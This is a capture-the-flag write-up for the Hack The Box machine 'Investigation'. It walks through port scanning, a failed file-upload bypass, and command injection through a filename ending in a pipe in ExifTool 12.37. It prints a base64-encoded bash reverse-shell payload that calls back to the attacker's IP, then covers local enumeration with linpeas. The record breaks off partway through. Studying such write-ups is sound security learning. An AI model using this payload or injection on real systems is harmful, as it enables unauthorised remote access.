 ![image](https://user-images.githubusercontent.com/87700008/221355489-6f404be9-6582-460a-aa3d-ecc3eaa1392b.png)

https://app.hackthebox.com/machines/Investigation

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
## Enuemration :

I started with q qucik rustscan & observed only 2 open ports on the network, i.e 22 & 80

![image](https://user-images.githubusercontent.com/87700008/221355635-38b21308-4d60-427d-b5c4-ec39f8a8f594.png)

    - 22 open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
    - 80 open http syn-ack ttl 63 Apache httpd 2.4.41
    
In the port scan results I found a domain as well 'http://eforenzics.htb/' , which I added to /etc/hosts file.
Browsed through the website & found an upload image options for forensics results.

![image](https://user-images.githubusercontent.com/87700008/221406576-cc1c2a20-e482-493c-ba17-fc0e2918370c.png)
![image](https://user-images.githubusercontent.com/87700008/221406588-b3dc4bfe-c879-4ec7-8eab-9c42c94accf1.png)

Then I proceeded with the subdomain scanning of the webserver & found only 1 result in it '/assets'

![image](https://user-images.githubusercontent.com/87700008/221356009-866a66d0-d4ff-4de4-a1b4-e9dd65dca4bd.png)

I then tried to accessing the '/assets' but got 403 error.

Then I tried to upload the .php file in hope to get some shell but the filters are blocking the upload other than .jpg & .png.
I tried many filters to bypass but it wasn't working.

![image](https://user-images.githubusercontent.com/87700008/221406739-726f6087-f029-4b28-9743-1de130451c22.png)

Then after multiple failure I uploaded regular PNG image & it gave the the forensics results of the image.

![image](https://user-images.githubusercontent.com/87700008/221406805-c9dc7b77-bec4-4054-8635-c1008c84b7bb.png)

I observed that the website is using the 'ExifTool ver 12.37' for the image forensics purpose.

![image](https://user-images.githubusercontent.com/87700008/221406990-c08f0376-9fcc-4a3b-ab76-fdbedf912943.png)

Searching the exploit for this version I landed on this [page.](https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429)
Which states "An attacker can pass a filename that ends with a pipe (|) to exiftool and if it exists on the filesystem, execute it as an operating system command."

I tried the same using burp & to test it I first started the tcpdump & icmp server to check if I get any response from the machine or not. And I got the response from the host.

    sudo tcpdump icmp -i tun0 -v
  
![image](https://user-images.githubusercontent.com/87700008/221408521-4c20505d-9d29-4cd0-96a0-e6e0271fafd1.png)

After the confirmation that the website is responding & exiftool is vulnerable now it's time for the Rev Shell.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Initial access :

I tried injection the regular bash payload for reverse shell but didn't received any shell, there may be some filters running on the website.
I then encoded the payload in base64 format & appended the decode function after it so that we can execute the payload as well.

    echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41NS81MyAwPiYxCg==' | base64 -d | bash|
    
![image](https://user-images.githubusercontent.com/87700008/221409232-b34266c4-4d49-471a-a7af-78675876e693.png)

This time I received the reverse shell with the user running '**www-data**', then stabilized the shell.

I got a user folder in the home directory 'smorton', but I don't have access for his folder.

![image](https://user-images.githubusercontent.com/87700008/221428367-d7865d17-d9d8-4042-9ee1-887142c1f91b.png)

I then tried to check for the vectors of priv esc but few of the methods are asking for user password which I don't have.
I then ran 'linpeas' to check for possible priv esc vectors, I found a cronjob running from '**/usr/bin/crontab**' which is performing some activity in this folder '**/usr/local/investigation/analysed_log**'

![image](https://user-images.githubusercontent.com/87700008/221429059-806cdb8c-5197-4910-8015-11281a387c52.png)

Then I started digging the '**/usr/local/investigation/**' path & found one .msg file there, i.e. '**Windows Event Logs for Analysis.msg**'
I transferred this file into my machine & checked it's content online as I don't have any email reader in kali machine.

![image](https://user-images.githubusercontent.com/87700008/221429231-eb81053e-d8f8-477c-ae45-a8f9a62f317e.png)

I downloaded the e-mail attachment in my machine as well.
